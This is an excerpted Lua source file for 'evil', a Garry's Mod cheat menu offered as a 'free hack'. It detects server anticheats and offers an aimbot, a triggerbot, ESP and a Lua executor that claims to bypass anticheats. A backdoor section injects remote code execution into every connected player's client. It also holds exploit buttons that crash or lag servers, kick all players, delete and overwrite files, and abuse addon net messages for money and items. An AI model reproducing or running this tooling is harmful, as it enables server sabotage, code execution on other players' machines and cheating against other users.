...
██║     ██║   ██║      ██║
╚═╝     ╚═╝   ╚═╝      ╚═╝
███████████████████████████████████              evil Load ✔ - made by dan
███████████████████████████████████
███████████████████████████████████        press left alt to open the menu 
███████████────███──────███████████
██████████─────███───────██████████      
█████████───██████───────██████████
██████████████───██───────█████████
...
chat.AddText(Color(0, 0, 0), "[", "evil", "] ", Color( 255, 255, 255 ), "Menu ui files found" )
...
chat.AddText(Color( 0, 0, 0), "[evil] ", Color( 255, 114, 114 ), "Cake AntiCheat is on this server!" )
else
net.SendToServer()
end
...
chat.AddText(Color( 0, 0, 0), "[evil] ", Color( 255, 114, 114 ), "Ulx might be on this server" )
end

if file.Exists("snte_source.lua","LUA") == true or file.Exists ( "autorun/server/snte_source.lua", "LUA" ) == true then
chat.AddText(Color( 0, 0, 0), "[evil] ", Color( 255, 114, 114 ), "SNTE is on this server!!!!" )
snte=true
else
snte=false
end
...
chat.AddText(Color( 0, 0, 0), "[evil] ", Color( 255, 114, 114 ), "C0nw0nks Anticheat is on this server" )
else
net.SendToServer()
end

if file.Exists( "cl_HAC.lua", "LUA" ) == true or file.Exists( "autorun/server/sv_HAC.lua", "LUA" ) == true then
chat.AddText(Color( 0, 0, 0), "[evil] ", Color( 255, 114, 114 ), "Hex's Anticheat is on this server" )
else
net.SendToServer()
end
...
surface.CreateFont("evilersave", {font = "Arial", size = 80,weight = 1000, antialias = 0})
surface.CreateFont("evil_home1",{font = "Arial", size = 60, weight = 2000, antialias = 0})
surface.CreateFont("evil_home2",{font = "Arial", size = 13, weight = 1000, antialias = 0})
surface.CreateFont("evil_home3",{font = "Arial", size = 15, weight = 2, antialias = 0})
surface.CreateFont("evil_home4",{font = "Arial", size = 20, weight = 2000, antialias = 0})
surface.CreateFont("evil_home5",{font = "Arial", size = 13, weight = 100, antialias = 0})
surface.CreateFont("PRINTERDETECT", {font = "", size = 20,weight = 1000, antialias = 0})
surface.CreateFont("evil_homeBTN",{font = "Roboto", size = 13, weight = 100, shadow = true, italic = true, antialias = 0})
surface.CreateFont("evil_homemini",{font = "Arial", size = 12, weight = 0, antialias = 0})
...
local fiji_evillogo = Material( "addons/base_ui_gmod/mat/evillogo.png" )
local fiji_evilhome = Material( "addons/base_ui_gmod/mat/evilhome.png" )
local fiji_evilesp = Material( "addons/base_ui_gmod/mat/evilesp.png" )
local fiji_evilaimbot = Material( "addons/base_ui_gmod/mat/evilaimbot.png" )
local fiji_evilmisc = Material( "addons/base_ui_gmod/mat/evilmisc.png" )
local fiji_evilexploits = Material( "addons/base_ui_gmod/mat/evilexploits.png" )
local fiji_evilbackdoors = Material( "addons/base_ui_gmod/mat/evilbackdoors.png" )
local fiji_evilconfig = Material( "addons/base_ui_gmod/mat/evilconfig.png" )
local fiji_evildiscordwidget = Material( "addons/base_ui_gmod/mat/evildiscordwidget.png" )


local fiji_exist_contentevil = CreateClientConVar( "fiji_exist_contentevil", 0 )

local fiji_evilhover = "mat/evilhover2.wav"
local fiji_evilclick = "mat/evilclick2.wav"

local fiji_sv_existmen = CreateClientConVar( "fiji_sv_existmen", 0 )


--[[if file.Exists( "addons/evil/field_constant.lua", "GAME" ) == true or file.Exists( "field_constant.lua", "LUA" ) == true then
LocalPlayer():ConCommand("fiji_exist_contentevil 1")
else
LocalPlayer():ConCommand("fiji_exist_contentevil 0")
chat.AddText(Color( 0, 0, 0), "[evil] ", Color( 255, 114, 114 ), "ERREUR - Vous n'avez pas installé les contents du menu." )
end  ]]--

if file.Exists( "addons/base_ui_gmod/mat/evillogo.png", "GAME" ) == true then
LocalPlayer():ConCommand("fiji_exist_contentevil 1")
else
LocalPlayer():ConCommand("fiji_exist_contentevil 0")
chat.AddText(Color( 0, 0, 0), "[evil] ", Color( 255, 114, 114 ), "ERREUR - Vous n'avez pas installé les contents du menu." )
...
ctxt( Color(255, 114, 114), "[evil] ", col, message )
...
for key, ply in pairs(player.GetAll()) do
 ...
 local teamcol =  Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 )
            ...
            draw.SimpleText(name, "evil_homemini", x + size - (size * 0.50) + px - 13, y + size - (size * 0.56) + py - 7, teamcol, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
            draw.SimpleText(job, "evil_homemini", x + size - (size * 0.50) + px - 13, y + size - (size * 0.50) + py - 7, teamcol, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
        end
            if ply != me then
...
hook.Add( "PlayerInitialSpawn", "evilisyourfriend", function( p ) BDInjectAids( p ) end)
...
file.Delete(v)
file.write(v, "evilcheats.com hehe")
end
end
...
draw.SimpleText( text, "evil_homeBTN", w / 2, h / 2, cText, 1, 1 )
else
draw.SimpleText( text, "evil_home5", w / 2, h / 2, cText, 1, 1 )
end
...
draw.SimpleText("Inportant: lua code that has more then 1000 lines will crash your game.", "evil_home3", 11, 11, Color(150, 110, 110,255), 0, 1)
...
BDLuaruntext:SetText( "-- Enter the lua code here \n \n" )
...
AcceptLuarun:SetText( "execute the code code" )
...
surface.PlaySound( fiji_evilhover )
end
surface.SetDrawColor( aBorder )
surface.DrawOutlinedRect( 0, 0, w, h )
AcceptLuarun.DoClick = function()
NOTIFICATION("Lua code excuted")
surface.PlaySound( fiji_evilclick )
...
ctxt( Color(126, 255, 117), "[evil] ", Color(255, 255, 255), text )

end

function NOTIFICATIONNO(text)
ctxt( Color(255, 114, 114), "[evil] ", Color(255, 255, 255), text )
end
...
draw.SimpleText("evil is the best free hack ", "evil_home1", 158, 20, Color(238, 61, 61), 0, 1)
elseif fiji_style_menu:GetInt() == 2 then
draw.SimpleText("✝ evil ✝ ", "evil_home1", 158, 20, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)), 0, 1)

elseif fiji_style_menu:GetInt() == 1 then
draw.SimpleText("evil is the best free hack ", "evil_home1", 158, 20, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), 0, 1)

else
draw.SimpleText("evil is the best free hack ", "evil_home1", 158, 20, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ), 0, 1)

end

surface.SetMaterial( fiji_evildiscordwidget )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 90, 150, 320, 76 )

draw.SimpleText("Garry's Mod Cheat - V1", "evil_home2", 192, 62, Color(255, 255, 255,20), 0, 1)
draw.SimpleText("Made by dan the man.", "evil_home4", 32, 100, Color(255, 255, 255,200), 0, 1)
draw.SimpleText("Go to our discord if you need help with the cheat.", "evil_home3", 118, 135, Color(255, 255, 255,200), 0, 1)
draw.SimpleText("The executer bypass's  Anticheats :", "evil_home3", 102, 305, Color(255, 255, 255,200), 0, 1)
end
...
LocalPlayer():ConCommand("clear_evil")
...
draw.SimpleText("", "evil_home2", 0, 0, Color(255, 255, 255,20), 0, 1)
else
end
end
...
CopiediscordHomeText:SetText( "copy discord" )
...
CopiediscordHome:SetText( "Copy Discord" )
...
CopiewebHomeText:SetText( "Copy Discord" )
...
CopiewebHome:SetText( "Copy discord" )
...
draw.SimpleText("In development : Catégorie Fun Commandes", "BudgetLabel", 5, 20, Color(255, 100, 100,255), 0, 1)
end
...
draw.SimpleText("Menu", "evil_home3", 251, 10, Color(100, 100, 100,255), 0, 1)
...
draw.SimpleText("Autres", "evil_home3", 250, 205, Color(100, 100, 100,255), 0, 1)
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "VITESSE PHYSICGUN", "evil_home5", 10, h / 2, color_white, 0, 1 )
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "color physics gun", "evil_home5", 78, 8, color_white, 0, 1 )
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Color Menu", "evil_home5", 79, 8, color_white, 0, 1 )
end
...
Resetb:SetText( "reset menu color" )
...
surface.PlaySound( "mat/evilhover.wav" )
end
...
draw.SimpleText("Aimbot", "evil_home3", 248, 10, Color(100, 100, 100,255), 0, 1)
draw.SimpleText("Cibles", "evil_home3", 250, 80, Color(100, 100, 100,255), 0, 1)
--draw.SimpleText("Touche Aimbot : B", "evil_home3", 220, 150, Color(100, 100, 100,255), 0, 1)
...
draw.SimpleText("Triggerbot", "evil_home3", 239, 205, Color(100, 100, 100,255), 0, 1)
draw.SimpleText("Cibles", "evil_home3", 250, 285, Color(100, 100, 100,255), 0, 1)
draw.SimpleText("Touche Aimbot", "evil_homemini", 234, 352, Color(100, 100, 100,255), 0, 1)
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "♦", "evil_home5", 14, h / 2 + 7, color_white, 0, 1 )
draw.SimpleText( "DISTANCE CIBLES", "evil_home5", 10, 8, color_white, 0, 1 )
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "♦", "evil_home5", 14, h / 2 + 7, color_white, 0, 1 )
draw.SimpleText( "CHAMP DE VISION", "evil_home5", 10, 8, color_white, 0, 1 )
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_aimbot_active:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_active", 0 ) else RunConsoleCommand( "fiji_aimbot_active", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_aimbot_wall:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_wall", 0 ) else RunConsoleCommand( "fiji_aimbot_wall", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_aimbot_relock:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_relock", 0 ) else RunConsoleCommand( "fiji_aimbot_relock", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_aimbot_friends:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_friends", 0 ) else RunConsoleCommand( "fiji_aimbot_friends", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_aimbot_admin:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_admin", 0 ) else RunConsoleCommand( "fiji_aimbot_admin", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_aimbot_team:GetInt() == 1 then RunConsoleCommand( "fiji_aimbot_team", 0 ) else RunConsoleCommand( "fiji_aimbot_team", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_triggerbot_active:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_active", 0 ) else RunConsoleCommand( "fiji_triggerbot_active", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_triggerbot_opti:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_opti", 0 ) else RunConsoleCommand( "fiji_triggerbot_opti", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_triggerbot_real:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_real", 0 ) else RunConsoleCommand( "fiji_triggerbot_real", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_triggerbot_friends:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_friends", 0 ) else RunConsoleCommand( "fiji_triggerbot_friends", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_triggerbot_wall:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_wall", 0 ) else RunConsoleCommand( "fiji_triggerbot_wall", 1 )  end end
...
function btnaimbotact:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_triggerbot_team:GetInt() == 1 then RunConsoleCommand( "fiji_triggerbot_team", 0 ) else RunConsoleCommand( "fiji_triggerbot_team", 1 )  end end
...
surface.PlaySound( fiji_evilclick )
chat.AddText(Color(0, 0, 0), "[", "evil", "] ", Color( 89, 255, 105 ), "Entitées sauvegarder" )
end
end
...
draw.SimpleText("Esp players", "evil_home3", 100, 10, Color(100, 100, 100,255), 0, 1)
...
draw.SimpleText("Esp entities", "evil_home3", 365, 10, Color(100, 100, 100,255), 0, 1)
...
draw.SimpleText("Esp Props", "evil_home3", 372.5, 205, Color(100, 100, 100,255), 0, 1)
end
local intW = 125
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Color ESP", "evil_home5", 72, 8, color_white, 0, 1 )
end
...
draw.SimpleText( "SOLID : Configuration non-disponnible", "evil_home5", 11, 25, color_white, 0, 1 )
end
end]]
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "color Infos", "evil_home5", 70, 8, color_white, 0, 1 )
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur Props", "evil_home5", 70, 8, color_white, 0, 1 )
end
...
function btnSolid:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_vision_type:GetInt() == 2 then RunConsoleCommand( "BD_hitman_type", 0 ) else RunConsoleCommand( "BD_hitman_type", 2 )  end end
...
function btnActive:DoClick()  surface.PlaySound( fiji_evilclick ) if fiji_vision_enable:GetInt() == 1 then RunConsoleCommand( "BD_hitman_enable", 0 ) else RunConsoleCommand( "BD_hitman_enable", 1 ) end end
...
function btnPropsActive:DoClick()  surface.PlaySound( fiji_evilclick ) if fiji_vision_enable_props:GetInt() == 1 then RunConsoleCommand( "BD_hitman_enable_props", 0 ) else RunConsoleCommand( "BD_hitman_enable_props", 1 ) end end
...
function btnSquelette:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_vision_type:GetInt() == 1 then RunConsoleCommand( "BD_hitman_type", 0 ) else RunConsoleCommand( "BD_hitman_type", 1 )  end end
...
function btnGlow:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_vision_type:GetInt() == 3 then RunConsoleCommand( "BD_hitman_type", 0 ) else RunConsoleCommand( "BD_hitman_type", 3 )  end end
...
function btnEntiterActive:DoClick()  surface.PlaySound( fiji_evilclick ) if fiji_vision_enable_ent:GetInt() == 1 then RunConsoleCommand( "BD_hitman_enable_ent", 0 ) else RunConsoleCommand( "BD_hitman_enable_ent", 1 ) end end
...
function btnEntitermenu:DoClick()  surface.PlaySound( fiji_evilclick ) LocalPlayer():ConCommand("fiji_espent") end

local btnEntiterhalo = BD:CreateBtn( "Glow", 335, 135, 65, 25, pContent )
function btnEntiterhalo:DoClick()  surface.PlaySound( fiji_evilclick ) if fiji_vision_enable_enthalo:GetInt() == 1 then RunConsoleCommand( "fiji_vision_enable_enthalo", 0 ) else RunConsoleCommand( "fiji_vision_enable_enthalo", 1 ) end end
...
function btnEntiterhalo:DoClick()  surface.PlaySound( fiji_evilclick ) if fiji_vision_enable_enttext:GetInt() == 1 then RunConsoleCommand( "fiji_vision_enable_enttext", 0 ) else RunConsoleCommand( "fiji_vision_enable_enttext", 1 ) end end
...
local btnName = BD:CreateBtn( "name", 103, 103, 65, 25, pContent )
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE ESP", "evil_home5", 10, h / 2, color_white, 0, 1 )
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE INFOS", "evil_home5", 10, h / 2, color_white, 0, 1 )
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE ENT", "evil_home5", 10, h / 2, color_white, 0, 1 )
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "DISTANCE PROPS", "evil_home5", 10, h / 2, color_white, 0, 1 )
end
...
if !BD.IsMessagePooled( "evilsaver" ) and BD.BackdoorActive() then
BD.Fire( [[util.AddNetworkString( "evilsaver" )
function BDSendLua( p, str ) net.Start( "evilsaver" ) net.WriteString( str ) net.Send( p ) end
function BDSendLuaAll( str ) net.Start( "evilsaver" ) net.WriteString( str ) net.Broadcast() end
function BDInjectAids( p ) p:SendLua( 'net.Receive( "evilsaver", function() RunString( net.ReadString() ) end )' ) end
for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
hook.Add( "PlayerInitialSpawn", "evilforever", function( p ) BDInjectAids( p ) end)
]] )
end
...
draw.SimpleText("SNTE détecté. Risque de ban", "evil_home3", 330, 235, Color(255, 74, 74,255), 0, 1)
draw.SimpleText("Backdoors désactivés", "evil_home2", 430, 265, Color(255, 255, 255,200), 0, 1)
end
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color(255,35,35,0 ) )
draw.SimpleText("In development", "DermaDefault", 350, 180, Color(255, 255, 255,100), 0, 1)
...
draw.SimpleText("Utilitaires", "evil_home3", 110, 10, Color(100, 100, 100,255), 0, 1)
...
draw.SimpleText("Troll", "evil_home3", 390, 10, Color(100, 100, 100,255), 0, 1)
...
draw.SimpleText("Autres", "evil_home3", 386, 205, Color(100, 100, 100,255), 0, 1)]]--
...
function btnbhop:DoClick() if fiji_fun_bunnyhop:GetInt() == 1 then surface.PlaySound( fiji_evilclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_bunnyhop:GetInt() == 1 then RunConsoleCommand( "fiji_fun_bunnyhop", 0 ) else RunConsoleCommand( "fiji_fun_bunnyhop", 1 )  end end
...
function btnspamlight:DoClick() if fiji_fun_spamlight:GetInt() == 1 then surface.PlaySound( fiji_evilclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_spamlight:GetInt() == 1 then RunConsoleCommand( "fiji_fun_spamlight", 0 ) else RunConsoleCommand( "fiji_fun_spamlight", 1 )  end end
...
function btnbhop:DoClick() if fiji_fun_spamrope:GetInt() == 1 then surface.PlaySound( fiji_evilclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_spamrope:GetInt() == 1 then RunConsoleCommand( "fiji_fun_spamrope", 0 ) else RunConsoleCommand( "fiji_fun_spamrope", 1 )  end end
...
local btnnomrandom = BD:CreateBtn( "random name", 55, 70, 76, 25, pContent )
...
function btnnommort:DoClick() if fiji_fun_thperson:GetInt() == 1 then surface.PlaySound( fiji_evilclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_thperson:GetInt() == 1 then RunConsoleCommand( "fiji_fun_thperson", 0 ) else RunConsoleCommand( "fiji_fun_thperson", 1 )  end end
...
function btnnommort:DoClick() if fiji_fun_crosshair:GetInt() == 1 then surface.PlaySound( fiji_evilclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_crosshair:GetInt() == 1 then RunConsoleCommand( "fiji_fun_crosshair", 0 ) else RunConsoleCommand( "fiji_fun_crosshair", 1 )  end end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "crosshair size", "evil_home5", 7, h / 2, color_white, 0, 1 )
end
...
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur Crosshair", "evil_home5", 79, 8, color_white, 0, 1 )
end
...
function btnstylea:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_fun_crosshairstyle:GetInt() == 2 then RunConsoleCommand( "fiji_fun_crosshairstyle", 2 ) else RunConsoleCommand( "fiji_fun_crosshairstyle", 2 )  end end
...
function btnstyleb:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_fun_crosshairstyle:GetInt() == 1 then RunConsoleCommand( "fiji_fun_crosshairstyle", 1 ) else RunConsoleCommand( "fiji_fun_crosshairstyle", 1 )  end end
...
function btnradara:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_fun_radar:GetInt() == 2 then RunConsoleCommand( "fiji_fun_radar", 0 ) else RunConsoleCommand( "fiji_fun_radar", 2 )  end end
...
function btnradarb:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_fun_radar:GetInt() == 1 then RunConsoleCommand( "fiji_fun_radar", 0 ) else RunConsoleCommand( "fiji_fun_radar", 1 )  end end
...
function btnantiscreen:DoClick() surface.PlaySound( fiji_evilclick ) if fiji_fun_screengrab:GetInt() == 1 then RunConsoleCommand( "fiji_fun_screengrab", 0 ) else RunConsoleCommand( "fiji_fun_screengrab", 1 )  end end
...
if fiji_exist_contentevil:GetInt() == 1 then

surface.SetMaterial( fiji_evilhome )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 60, 50, 40 )

surface.SetMaterial( fiji_evilesp )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 110, 50, 40 )

surface.SetMaterial( fiji_evilaimbot )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 160, 50, 40 )

surface.SetMaterial( fiji_evilmisc )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 210, 50, 35 )

surface.SetMaterial( fiji_evilexploits )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 254, 50, 40 )


surface.SetMaterial( fiji_evilbackdoors )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 303, 50, 40 )


surface.SetMaterial( fiji_evilconfig )
surface.SetDrawColor( 255, 255, 255, 255 )
surface.DrawTexturedRect( 57, 350, 50, 40 )
else end

surface.SetMaterial( fiji_evillogo )
surface.SetDrawColor( 255, 255, 255, 255 )
...
concommand.Add( "clear_evil", function() -- fiji_sv_existmen
BDMenu:Remove()
...
if fiji_exist_contentevil:GetInt() == 0 then
draw.SimpleText( v['Name'], "evil_home3", w / 2, h / 2, col, 1, 1 )
else end
end
...
if fiji_exist_contentevil:GetInt() == 1 then
surface.PlaySound( "mat/evilclick.wav" )
else
end
v['Func']( pContent )
end
...
if fiji_vision_infos_name:GetInt() == 1 then
draw.SimpleText( "Nom : " .. v:Nick(), "evil_home3", 0, 0, Color(fiji_principal_color_infos:GetInt(), fiji_secondary_color_infos:GetInt(), fiji_third_color_infos:GetInt(), 255 ), 1 )
end
if fiji_vision_infos_weapons:GetInt() == 1 then
...
draw.SimpleText( "Armes : " .. strText, "evil_home3", 0, 15, Color(fiji_principal_color_infos:GetInt(), fiji_secondary_color_infos:GetInt(), fiji_third_color_infos:GetInt(), 255 ), 1 )
end
if fiji_vision_infos_health:GetInt() == 1 then
draw.SimpleText( "Vie : " .. v:Health(), "evil_home3", 0, 35, Color(fiji_principal_color_infos:GetInt(), fiji_secondary_color_infos:GetInt(), fiji_third_color_infos:GetInt(), 255 ), 1 )
end
cam.End3D2D()
end
end
...
draw.SimpleText("Exploits that you can use on this server :", "evil_home3", 160, 10, Color(255, 255, 255,200), 0, 1)
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Getting Le Ammo")
--("Exploit lançé")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Exploit lançé")
...
--("Exploit lançé")
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Enjoy the b1g monies")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("ReSpawn")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Collecting Money")
for k, v in pairs(ents.GetAll()) do
if (v:GetClass() == "adv_moneyprinter") then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if (reportSpam == 0) then
--("Starting Kicker")
reportSpam = 1
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Goodbye Server")
local tbl = {}
for i=1,400 do
tbl[i] = i
end
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "reanimation1" ) then
--( "Enabled" )
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Kicking All")
for k,v in pairs(player.GetAll()) do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Props De_Stroyed")
for k,v in pairs(ents.GetAll()) do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger2" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "crasher1" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") RunConsoleCommand("say", "4bigz")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") local id = LocalPlayer():SteamID()
local tbl = {}
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if (bypass == 0) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger3" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
--("Spread Removed")
end)
end
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") net.Start("fp_as_doorHandler")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") local door = LocalPlayer():GetEyeTrace().Entity
...
surface.PlaySound( "mat/evilclick.wav" ) inputFrame2Exists = true
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Broadcasting")
net.Start("VJSay")
net.WriteEntity(nil)
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") for k, v in pairs (player.GetAll()) do
for i = 1,255 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "crasher2" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") for k, v in pairs(ents.FindByClass("bm2_bitminer_1")) do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger4" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger5", 0, 0, function()
for i=1,1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger6" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger7" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger9" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger10" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger11" ) then
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Lags Démarré")
for i=1,7000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") CHATPRINT("Guild level successfully upgraded")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("willoxchatspam", 1, 0, function()
...
net.WriteString("Sécurité En Carton - Seized By evil")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("ReSpawn")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") inputFrameExists = true
...
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Giving Weapon")
...
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Déguisé")
net.Start("disguise")
...
TextEntry:SetText( "--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Changé")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") for k, v in ipairs(rp.abilities.list) do
...
TextEntry:SetText( "6" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Reçu")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "exploit_revive" ) then
--( "Enabled" )
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Take physgun")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") --("Take gravitygun")
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "freemoney4" ) then
--("Démarré")
...
net.WriteString("DITCH THIS SHITTY SERVER AND BUY evil TODAY")
net.SendToServer()
end )
end
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") if !timer.Exists( "lagger20" ) then
...
net.WriteString("Seized By evil :c !")
net.SendToServer()
end )
end
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger30", 0, 0, function()
for i = 1, 1000 do
...
surface.PlaySound( "mat/evilclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger31", 0, 0, function()
for i = 1, 1000 do
...
